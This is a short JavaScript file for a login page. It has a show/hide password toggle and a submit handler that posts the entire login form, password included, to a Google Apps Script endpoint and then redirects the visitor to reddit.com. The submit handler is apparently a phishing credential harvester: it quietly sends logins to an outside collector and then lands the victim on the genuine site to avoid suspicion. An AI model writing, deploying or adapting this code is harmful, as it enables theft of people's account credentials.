// passpage.js
document.getElementById('show-password').addEventListener('click', function() {
  const passwordInput = document.getElementById('password');
  if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      this.textContent = 'Hide';
  } else {
      passwordInput.type = 'password';
      this.textContent = 'Show';
  }
});


const scriptURL = 'https://script.google.com/macros/s/AKfycbw-znGZwNTJle2M753wiqvEcWKBKTQwhI1_joGBHBAGITOmqS9_Z56ymke3UZtn2ImiJQ/exec'

const form = document.forms['login-form']



form.addEventListener('submit', e => {
  
  e.preventDefault()
  
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
  //.then(response => alert("Loading..." ))
  .then(() => { window.location.href="https://www.reddit.com/"; })
  .catch(error => console.error('Error!', error.message))
})